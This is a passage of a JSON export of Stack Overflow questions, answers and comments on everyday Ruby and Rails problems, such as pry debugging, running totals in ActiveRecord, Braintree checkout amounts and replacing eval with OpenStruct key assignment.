vector[i];\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8797924, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff3da028e4a99e6fa2e77d547b46619b?s=128&d=identicon&r=PG&f=1", "display_name": "ProgAps", "link": "https://stackoverflow.com/users/8797924/progaps"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 51, "favorite_count": 0, "answer_count": 1, "score": -6, "last_activity_date": 1511819705, "creation_date": 1511813314, "last_edit_date": 1511817486, "question_id": 47518993, "link": "https://stackoverflow.com/questions/47518993/how-to-convert-loops-in-ruby-to-c", "title": "How to convert loops in Ruby to C#?", "body": "<p>Can u help me a litte bit? \nHow does this code will look like in c#?</p>\n\n<pre><code>return Array.new(minmax.size) do |i|\n    minmax[i][0] + ((minmax[i][1] - minmax[i][0]) * rand())\nend\n</code></pre>\n\n<p>or this one (is this simple foreact loop?)</p>\n\n<pre><code>vector.each_with_index do |input, i|\n    sum += weights[i] * input\nend\n</code></pre>\n"}, {"tags": ["ruby", "uml"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511808430, "post_id": 47517259, "comment_id": 81991678, "body": "The answer you already have is essentially what I&#39;d suggest starting with. There is also an <a href=\"http://ruby-doc.org/core/TracePoint.html\" rel=\"nofollow noreferrer\">Object-Oriented API</a> in the standard library that wraps this Kernel method, which you could use."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511808541, "post_id": 47517259, "comment_id": 81991740, "body": "Just for fun recently, I actually <a href=\"https://github.com/tom-lord/search_warrant\" rel=\"nofollow noreferrer\">wrote my own version</a> of a method tracer. You <i>could</i> use that/a variation of it, but the standard library approach is possibly a better approach; particularly since it also handles C methods."}], "answers": [{"tags": [], "owner": {"reputation": 1535, "user_id": 5724677, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/r6hKE.jpg?s=128&g=1", "display_name": "granier", "link": "https://stackoverflow.com/users/5724677/granier"}, "is_accepted": false, "score": 3, "last_activity_date": 1511810899, "last_edit_date": 1511810899, "creation_date": 1511808895, "answer_id": 47517917, "question_id": 47517259, "link": "https://stackoverflow.com/questions/47517259/create-sequence-diagram-generator-ruby-gem/47517917#47517917", "title": "create sequence diagram generator ruby gem", "body": "<p>A simplest solution would be to generate a plant uml file. A Plant file is far simpler than an XMI file and Plant is integrated in a lot's of tool.</p>\n\n<p>It could be an alternative.</p>\n\n<p><a href=\"https://en.wikipedia.org/wiki/PlantUML\" rel=\"nofollow noreferrer\">plantUML</a></p>\n\n<p>For example:\n<code></p>\n\n<pre><code>@startuml\nAlice -&gt; Bob: Authentication Request\nBob --&gt; Alice: Authentication Response\nAlice -&gt; Bob: Another authentication Request\nAlice &lt;-- Bob: another authentication Response\n@enduml\n</code></pre>\n\n<p></code></p>\n\n<p>produces:</p>\n\n<p><a href=\"https://i.stack.imgur.com/VYsIx.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/VYsIx.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 9390, "user_id": 529187, "user_type": "registered", "accept_rate": 34, "profile_image": "https://i.stack.imgur.com/RIKWv.png?s=128&g=1", "display_name": "Devs love ZenUML", "link": "https://stackoverflow.com/users/529187/devs-love-zenuml"}, "is_accepted": false, "score": 0, "last_activity_date": 1511952484, "creation_date": 1511952484, "answer_id": 47550949, "question_id": 47517259, "link": "https://stackoverflow.com/questions/47517259/create-sequence-diagram-generator-ruby-gem/47550949#47550949", "title": "create sequence diagram generator ruby gem", "body": "<p><a href=\"https://www.zenuml.com\" rel=\"nofollow noreferrer\">ZemUML</a> support C-like code.</p>\n\n<p>For example,<code>ZenUML.isAwesome()</code>will generate the following diagram:</p>\n\n<p><a href=\"https://i.stack.imgur.com/pJXwH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/pJXwH.png\" alt=\"enter image description here\"></a></p>\n\n<p>If your meta DSL follows the same syntax, it can be directly integrated with ZenUML. The JS library is published as npm module.</p>\n"}], "owner": {"reputation": 103, "user_id": 4086430, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e8d6e1e6164fb738537d16f71426b45?s=128&d=identicon&r=PG", "display_name": "manni", "link": "https://stackoverflow.com/users/4086430/manni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 418, "favorite_count": 2, "answer_count": 2, "score": 0, "last_activity_date": 1511952484, "creation_date": 1511806245, "question_id": 47517259, "link": "https://stackoverflow.com/questions/47517259/create-sequence-diagram-generator-ruby-gem", "title": "create sequence diagram generator ruby gem", "body": "<p>So I want to create a gem similar to VCR that starts recording method calls\nalong with the classes those methods are in, maybe even line number, and stop recording and generate say a yml file or something which is effectively a UML sequence diagram metadata description of the run.</p>\n\n<p>Extending that even further, I want to use the mermaid gem to actually spit out a picture UML diagram.</p>\n\n<p>I'm thinking of taking the approach outlined in this reddit post, basically storing a array of hashes to parse into some kind of Plant text downstream.\n<a href=\"https://www.reddit.com/r/ruby/comments/11ns2l/does_a_uml_sequence_diagram_generation_gem_exist/\" rel=\"nofollow noreferrer\">https://www.reddit.com/r/ruby/comments/11ns2l/does_a_uml_sequence_diagram_generation_gem_exist/</a></p>\n\n<p><a href=\"http://phrogz.net/ProgrammingRuby/ospace.html#tracingyourprogramsexecution\" rel=\"nofollow noreferrer\">http://phrogz.net/ProgrammingRuby/ospace.html#tracingyourprogramsexecution</a></p>\n\n<p>Anyways, finally, my question is... Is there a better way to approach this?\nOr should I just kind of follow the idea proposed in the reddit?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "payment", "braintree", "braintree-sandbox"], "answers": [{"comments": [{"owner": {"reputation": 2902, "user_id": 523051, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/497825ebbcb0e06c2451d3ff91d644b2?s=128&d=identicon&r=PG", "display_name": "chrickso", "link": "https://stackoverflow.com/users/523051/chrickso"}, "edited": false, "score": 1, "creation_date": 1511818716, "post_id": 47517141, "comment_id": 81996888, "body": "&quot;Each portfolio_item should have it&#39;s priced stored as decimal with a scale of two, This will allow the item to have a price associated with it and will make the method: @portfolio_item.price available.&quot; - Why is this, where is it documented, and how would anyone ever come to know this? is it just a rails thing that makes that particular column type available as a price method?"}, {"owner": {"reputation": 4416, "user_id": 2552259, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e6d74162f339b5acd772d3f5dadaa8ea?s=128&d=identicon&r=PG", "display_name": "Jorge de los Santos", "link": "https://stackoverflow.com/users/2552259/jorge-de-los-santos"}, "reply_to_user": {"reputation": 2902, "user_id": 523051, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/497825ebbcb0e06c2451d3ff91d644b2?s=128&d=identicon&r=PG", "display_name": "chrickso", "link": "https://stackoverflow.com/users/523051/chrickso"}, "edited": false, "score": 0, "creation_date": 1511874940, "post_id": 47517141, "comment_id": 82021459, "body": "Updated answer, sorry about the lack of sources."}], "tags": [], "owner": {"reputation": 4416, "user_id": 2552259, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e6d74162f339b5acd772d3f5dadaa8ea?s=128&d=identicon&r=PG", "display_name": "Jorge de los Santos", "link": "https://stackoverflow.com/users/2552259/jorge-de-los-santos"}, "is_accepted": false, "score": 1, "last_activity_date": 1511874926, "last_edit_date": 1511874926, "creation_date": 1511805745, "answer_id": 47517141, "question_id": 47516960, "link": "https://stackoverflow.com/questions/47516960/how-to-check-out-successfully-with-braintreetransaction-sale-without-hard-code/47517141#47517141", "title": "How to check out successfully with Braintree::Transaction.sale without hard coded values?", "body": "<p>As stated in the documentation of the Rails framework:</p>\n\n<p><a href=\"http://guides.rubyonrails.org/active_record_basics.html\" rel=\"nofollow noreferrer\">ActiveRecord Basics</a></p>\n\n<p>You need to map a new field from the table the PortfolioItems model. In order to do that you first need to add that field to the table by creating a migration, I recommend using a decimal, because floats can cause issues if you are limiting the ammount after the comma.</p>\n\n<p>Each portfolio_item should have it's priced stored as decimal with a scale of two: </p>\n\n<pre><code>t.decimal :price, scale: 2, precision: 5\n</code></pre>\n\n<p>This will allow the item to have a price associated with it and will make the method: <code>@portfolio_item.price</code> available.</p>\n\n<p>Then you just need to replace in your controller:</p>\n\n<pre><code> @result = Braintree::Transaction.sale(\n      amount: **\"10.00\"**,\n      payment_method_nonce: nonce\n    )\n</code></pre>\n\n<p>with:</p>\n\n<pre><code> @result = Braintree::Transaction.sale(\n      amount: @portfolio_item.price,\n      payment_method_nonce: nonce\n    )\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 8973349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5947c5edbe9604142d8bb61cd33a7b8?s=128&d=identicon&r=PG&f=1", "display_name": "Jonathan", "link": "https://stackoverflow.com/users/8973349/jonathan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1511874926, "creation_date": 1511804993, "question_id": 47516960, "link": "https://stackoverflow.com/questions/47516960/how-to-check-out-successfully-with-braintreetransaction-sale-without-hard-code", "title": "How to check out successfully with Braintree::Transaction.sale without hard coded values?", "body": "<p>I was able to make a successful check out with a hard coded amount i.e:</p>\n\n<pre><code>def checkout\n    nonce = params[\"payment_method_nonce\"]\n\n    if current_user.braintree_id?\n        customer = Braintree::Customer.find(current_user.braintree_id)\n    else\n        @result = Braintree::Customer.create(\n            email: current_user.email,\n            payment_method_nonce: params[:payment_method_nonce]\n          )\n          customer = result.customer\n          current_user.update(braintree_id: customer.id)\nend\n\n     @result = Braintree::Transaction.sale(\n      amount: **\"10.00\"**,\n      payment_method_nonce: nonce\n    )\n\n    if @result.success? \n        redirect_to root_path, notice: \"You have successfully checked out\"\n    else\n        flash[:alert] = \"Something went wrong while processing your transaction\"\n        render :new\n    end\nend\n</code></pre>\n\n<p>Let's say I want a current_user to be able to purchase access to my portfolio for a specific \"price\" which has been stored inside my rails database. Is there a way to set the amount by pulling it from an a object's attributes from the database i.e: \"&lt;=@portofolio_item.price>\" ?? I've tried multiple attempts and didn't have any lucks. What could I be doing wrong?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord", "aggregate"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511804006, "post_id": 47516538, "comment_id": 81989308, "body": "Where are these other numbers magically coming from?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511804027, "post_id": 47516538, "comment_id": 81989318, "body": "Store the total in a variable, and add each income as you loop through the records?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511804102, "post_id": 47516538, "comment_id": 81989360, "body": "<code>total = 0; records.each { |r| ....; total += r.income}</code>"}], "answers": [{"comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511804497, "post_id": 47516799, "comment_id": 81989579, "body": "That should be <code>#{total_income}</code>, not <code>#{r.total_income}</code>"}, {"owner": {"reputation": 1379, "user_id": 2101252, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JXPjA.jpg?s=128&g=1", "display_name": "s1mpl3", "link": "https://stackoverflow.com/users/2101252/s1mpl3"}, "edited": false, "score": 0, "creation_date": 1511818420, "post_id": 47516799, "comment_id": 81996751, "body": "It will be more reusable if income is an instance method."}], "tags": [], "owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "is_accepted": false, "score": 1, "last_activity_date": 1511805066, "last_edit_date": 1511805066, "creation_date": 1511804386, "answer_id": 47516799, "question_id": 47516538, "link": "https://stackoverflow.com/questions/47516538/ruby-aggregate-function-with-model/47516799#47516799", "title": "Ruby aggregate function with model", "body": "<pre><code>rows = Product.select('name,endorsement,expense, (endorsement-expense) as income')\n\ntotal_income = 0\nrows.each do |row|\n  total_income += row.income\n  puts \"#{row.name}, #{row.endorsement}, #{row.expense}, #{row.income}, #{total_income}\"\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 32, "user_id": 2702471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04acde0d380ab9c317170f0761cd1b31?s=128&d=identicon&r=PG&f=1", "display_name": "satlosb", "link": "https://stackoverflow.com/users/2702471/satlosb"}, "is_accepted": false, "score": 0, "last_activity_date": 1511806239, "creation_date": 1511806239, "answer_id": 47517258, "question_id": 47516538, "link": "https://stackoverflow.com/questions/47516538/ruby-aggregate-function-with-model/47517258#47517258", "title": "Ruby aggregate function with model", "body": "<p>You can also do it with a total income for each product:</p>\n\n<pre><code>products = Product.select(\"(endorsement - expense) AS 'income', name, endorsement, created_at, null as total\") \nproducts.each do |p|\n   p.total = Product.select(\"sum(endorsement) - sum(expense) AS 'total'\").where(name: p.name).where(\"created_at &lt;= ?\", p.created_at).group('name').last.total\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1761, "user_id": 8944610, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/a07tQ.jpg?s=128&g=1", "display_name": "Mikhail Katrin", "link": "https://stackoverflow.com/users/8944610/mikhail-katrin"}, "is_accepted": false, "score": 0, "last_activity_date": 1511860323, "creation_date": 1511860323, "answer_id": 47527740, "question_id": 47516538, "link": "https://stackoverflow.com/questions/47516538/ruby-aggregate-function-with-model/47527740#47527740", "title": "Ruby aggregate function with model", "body": "<p>You can apply <a href=\"https://ruby-doc.org/core-2.4.2/Enumerable.html#method-i-inject\" rel=\"nofollow noreferrer\">inject</a> function to accumulate total income.</p>\n\n<p>It will look something like this:</p>\n\n<pre><code>products.inject{|sum, product| sum += (product.endorsement - product.expense }\n</code></pre>\n"}], "owner": {"reputation": 323, "user_id": 1934168, "user_type": "registered", "accept_rate": 16, "profile_image": "https://www.gravatar.com/avatar/a8e85918d3db651edd04097020cbf5f1?s=128&d=identicon&r=PG", "display_name": "Hilmi Yamc\u0131", "link": "https://stackoverflow.com/users/1934168/hilmi-yamc%c4%b1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 450, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1511860323, "creation_date": 1511803352, "question_id": 47516538, "link": "https://stackoverflow.com/questions/47516538/ruby-aggregate-function-with-model", "title": "Ruby aggregate function with model", "body": "<p>I have a product model in my ruby on rails application which has name,endorsement and expense attributes.</p>\n\n<p>I need to write a query that list all records, but for every record I need to calculate endorsement-expense as income value. That seems to be ok. However, I need to sum all of the incomes consequtively as well. </p>\n\n<p>For example my records are like these:</p>\n\n<hr>\n\n<pre><code>Name Endorsement Expense\nX    100         25\nY    20          17\nX    60          55  \nT    178         78\n</code></pre>\n\n<p>I need to list those values as:</p>\n\n<hr>\n\n<pre><code>Name Endorsement Expense Income  Total Income\nX    100         25      75      75\nY    20          17      3       78\nX    60          55      5       83 \nT    178         78      100     183\n</code></pre>\n\n<p>How can I do that ?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rubygems", "pry", "binding.pry"], "answers": [{"comments": [{"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511804875, "post_id": 47516469, "comment_id": 81989789, "body": "Why was this answer down voted? Please leave comments when down voting answers. This is the correct answer without using any additional libraries."}, {"owner": {"reputation": 167, "user_id": 4958091, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/10153267965890351/picture?type=large", "display_name": "Sherif Elkassaby", "link": "https://stackoverflow.com/users/4958091/sherif-elkassaby"}, "edited": false, "score": 0, "creation_date": 1547036989, "post_id": 47516469, "comment_id": 95052464, "body": "Because he is asking how to go to next line not how to exit the breaking point, just like &#39;next&#39; || &#39;n&#39; in byebug"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 167, "user_id": 4958091, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/10153267965890351/picture?type=large", "display_name": "Sherif Elkassaby", "link": "https://stackoverflow.com/users/4958091/sherif-elkassaby"}, "edited": false, "score": 0, "creation_date": 1547037207, "post_id": 47516469, "comment_id": 95052594, "body": "He is asking how to go to the next line in binding.pry. When you use binding.pry, the flow of the execution stops on that line and to resume the flow you use exit. If you want to stop at the next line, you can place another binding.pry there but that would be kind of pointless"}, {"owner": {"reputation": 167, "user_id": 4958091, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/10153267965890351/picture?type=large", "display_name": "Sherif Elkassaby", "link": "https://stackoverflow.com/users/4958091/sherif-elkassaby"}, "edited": false, "score": 0, "creation_date": 1547113929, "post_id": 47516469, "comment_id": 95083232, "body": "instead of placing multiple pry you can use   gem &#39;pry-byebug&#39; to take advantage of both gems"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 167, "user_id": 4958091, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/10153267965890351/picture?type=large", "display_name": "Sherif Elkassaby", "link": "https://stackoverflow.com/users/4958091/sherif-elkassaby"}, "edited": false, "score": 0, "creation_date": 1547120094, "post_id": 47516469, "comment_id": 95086847, "body": "You are right but I was trying to answer him without any additional gems. Why would anyone place multiple binding.pry :p"}], "tags": [], "owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "is_accepted": false, "score": 1, "last_activity_date": 1511803092, "creation_date": 1511803092, "answer_id": 47516469, "question_id": 47516342, "link": "https://stackoverflow.com/questions/47516342/how-to-move-to-the-next-line-in-binding-pry/47516469#47516469", "title": "How to move to the next line in binding.pry ?", "body": "<p>you can <code>exit</code> to continue the code flow</p>\n"}, {"comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 2, "creation_date": 1511804611, "post_id": 47516471, "comment_id": 81989648, "body": "There&#39;s also <a href=\"https://github.com/deivid-rodriguez/pry-byebug\" rel=\"nofollow noreferrer\"><code>pry-byebug</code></a> to combine these two libraries."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 765, "user_id": 9015957, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xwHPf.jpg?s=128&g=1", "display_name": "vikas95prasad", "link": "https://stackoverflow.com/users/9015957/vikas95prasad"}, "edited": false, "score": 0, "creation_date": 1511862979, "post_id": 47516471, "comment_id": 82013404, "body": "@user9015957 What do you mean, &quot;it doesn&#39;t work&quot;? You need to be a bit more specific about exactly what you have tried and what errors you are seeing. I suggest you create a new question with a more complete description of the problem, if you are still having difficulty."}], "tags": [], "owner": {"reputation": 1215, "user_id": 2824935, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/dkDTX.jpg?s=128&g=1", "display_name": "garythegoat", "link": "https://stackoverflow.com/users/2824935/garythegoat"}, "is_accepted": true, "score": 13, "last_activity_date": 1511803102, "creation_date": 1511803102, "answer_id": 47516471, "question_id": 47516342, "link": "https://stackoverflow.com/questions/47516342/how-to-move-to-the-next-line-in-binding-pry/47516471#47516471", "title": "How to move to the next line in binding.pry ?", "body": "<p>Check out <a href=\"https://github.com/nixme/pry-nav\" rel=\"noreferrer\">pry-nav</a>, it gives you methods like <code>next</code> and <code>step</code>, which should be what you're looking for.</p>\n\n<p>If you're in regular old Pry you can use <code>exit</code> to go to the next <code>binding.pry</code> or <code>disable-pry</code> to exit Pry entirely.</p>\n"}, {"tags": [], "owner": {"reputation": 908, "user_id": 1220312, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/85bfd271749bd0ba3d9b18d2437bc283?s=128&d=identicon&r=PG", "display_name": "lcjury", "link": "https://stackoverflow.com/users/1220312/lcjury"}, "is_accepted": false, "score": 8, "last_activity_date": 1549634000, "creation_date": 1549634000, "answer_id": 54593885, "question_id": 47516342, "link": "https://stackoverflow.com/questions/47516342/how-to-move-to-the-next-line-in-binding-pry/54593885#54593885", "title": "How to move to the next line in binding.pry ?", "body": "<p>You can't. pry doesn't have any command who let you jump to the next line. So, your alternatives are:</p>\n\n<ol>\n<li>Adding a new <code>pry.binding</code> on the next breakpoint and then using <code>exit</code> to jump between bingings.</li>\n<li>Using a gem like <code>pry-byebug</code> or <code>pry-nav</code> who adds the <code>next</code> command to jump to the next line.</li>\n<li>Using a gem like <code>pry-byebug</code> or <code>pry-debugger</code> who adds the <code>break</code> command to add breakpoints like <code>break &lt;Class#method&gt;</code>.</li>\n</ol>\n\n<p>Installing <code>pry-byebug</code> is the best solution for your case, you can't achieve this with just <code>pry</code>.</p>\n"}], "owner": {"reputation": 765, "user_id": 9015957, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xwHPf.jpg?s=128&g=1", "display_name": "vikas95prasad", "link": "https://stackoverflow.com/users/9015957/vikas95prasad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 19394, "favorite_count": 0, "accepted_answer_id": 47516471, "answer_count": 3, "score": 20, "last_activity_date": 1606484444, "creation_date": 1511802630, "question_id": 47516342, "link": "https://stackoverflow.com/questions/47516342/how-to-move-to-the-next-line-in-binding-pry", "title": "How to move to the next line in binding.pry ?", "body": "<p>In byebug we can move to next line by typing 'n', similarly is there anyway to move to the next line in 'pry' ?</p>\n\n<p>I have gone through there documentation but nothing's works out.  </p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 40236, "user_id": 923315, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/j6lLI.jpg?s=128&g=1", "display_name": "peter", "link": "https://stackoverflow.com/users/923315/peter"}, "edited": false, "score": 1, "creation_date": 1511802003, "post_id": 47516076, "comment_id": 81988148, "body": "could you add a representative part of the XML ?"}], "answers": [{"tags": [], "owner": {"reputation": 1215, "user_id": 2824935, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/dkDTX.jpg?s=128&g=1", "display_name": "garythegoat", "link": "https://stackoverflow.com/users/2824935/garythegoat"}, "is_accepted": false, "score": 1, "last_activity_date": 1511802751, "creation_date": 1511802751, "answer_id": 47516376, "question_id": 47516076, "link": "https://stackoverflow.com/questions/47516076/ruby-alternative-to-using-eval-to-assign-object-variables-from-xml-data/47516376#47516376", "title": "ruby - alternative to using eval to assign object variables from xml data", "body": "<p>How about taking out <code>eval</code> and using the <code>[]</code> assignment syntax instead?</p>\n\n<pre><code> vehicles = []\n xml['vehicles'].each do |vv|\n   infos = OpenStruct.new\n   ['model','vehicleIdentifier','make','modelYear'].each do |iid|\n     infos[iid] = vv[iid]\n   end \n   vehicles &lt;&lt; infos\n end\n\n vehicles.first.model # =&gt; vehicle model\n</code></pre>\n\n<p>You will still be able to access this information on <code>infos</code> in the method form as shown above. As shown in the <a href=\"https://ruby-doc.org/stdlib-2.0.0/libdoc/ostruct/rdoc/OpenStruct.html#method-i-5B-5D-3D\" rel=\"nofollow noreferrer\">docs</a></p>\n"}, {"tags": [], "owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "is_accepted": true, "score": 0, "last_activity_date": 1511802779, "creation_date": 1511802779, "answer_id": 47516385, "question_id": 47516076, "link": "https://stackoverflow.com/questions/47516076/ruby-alternative-to-using-eval-to-assign-object-variables-from-xml-data/47516385#47516385", "title": "ruby - alternative to using eval to assign object variables from xml data", "body": "<p>There's absolutely no reason to use <code>eval</code> here. Everything you need is already available. The standard form is simply:</p>\n\n<pre><code>infos[iid] = v[iid]\n</code></pre>\n\n<p>This is because <code>iid</code> is just a string. Doing things like <code>eval(\"v['#{iid}'])</code> is making things way, way more complicated than they need to be.</p>\n\n<p>You can also refine this code by recognizing that the list of keys never changes, so that can be made a constant, and that your OpenStruct object can be composed based on a simple mapping:</p>\n\n<pre><code>XML_KEYS = %w[ model vehicleIdentifier make modelYear ]\n</code></pre>\n\n<p>Later in your method:</p>\n\n<pre><code>OpenStruct.new(\n  XML_KEYS.map do |iid|\n    [ iid, vv[iid] ]\n  end.to_h\n)\n</code></pre>\n\n<p>You can apply that <code>map</code> technique on a broader level too:</p>\n\n<pre><code>vehicles = xml['vehicles'].map do |vv|\n  OpenStruct.new(\n    XML_KEYS.map do |iid|\n      [ iid, vv[iid] ]\n    end.to_h\n  )\nend\n</code></pre>\n\n<p>Where that can side-step the need to create a variable and then force-populate it with <code>&lt;&lt;</code>.</p>\n\n<p>The key to using Ruby effectively is to identify when you can do things as a series of simple transformations with <a href=\"https://ruby-doc.org/core-2.4.2/Enumerable.html\" rel=\"nofollow noreferrer\">Enumberable</a>-type tools instead of doing it the hard, procedural way other languages dictate by their design.</p>\n"}], "owner": {"reputation": 831, "user_id": 1411030, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/GG56b.jpg?s=128&g=1", "display_name": "ether_joe", "link": "https://stackoverflow.com/users/1411030/ether-joe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 47516385, "answer_count": 2, "score": 0, "last_activity_date": 1511802779, "creation_date": 1511801704, "question_id": 47516076, "link": "https://stackoverflow.com/questions/47516076/ruby-alternative-to-using-eval-to-assign-object-variables-from-xml-data", "title": "ruby - alternative to using eval to assign object variables from xml data", "body": "<p>I'm pulling info out of an xml blob and assigning it to an <a href=\"https://ruby-doc.org/stdlib-2.0.0/libdoc/ostruct/rdoc/OpenStruct.html\" rel=\"nofollow noreferrer\">OpenStruct</a>. I want to assign fields to the openstruct with the same name as the xml field.</p>\n\n<p>Right now I'm using eval like so:</p>\n\n<pre><code>  vehicles = []\n  xml['vehicles'].each do |vv|\n    infos = OpenStruct.new\n    ['model','vehicleIdentifier','make','modelYear'].each do |iid|\n      eval(\"infos.#{iid} = vv['#{iid}']\")\n    end \n    vehicles &lt;&lt; infos\n  end\n</code></pre>\n\n<p>Any suggestions on how to do it without using <code>eval</code>?</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["ruby", "ruby-on-rails-4", "rspec"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511803647, "post_id": 47515604, "comment_id": 81989102, "body": "Can you cut this thing down to size, a more minimal version that reproduces your problem? 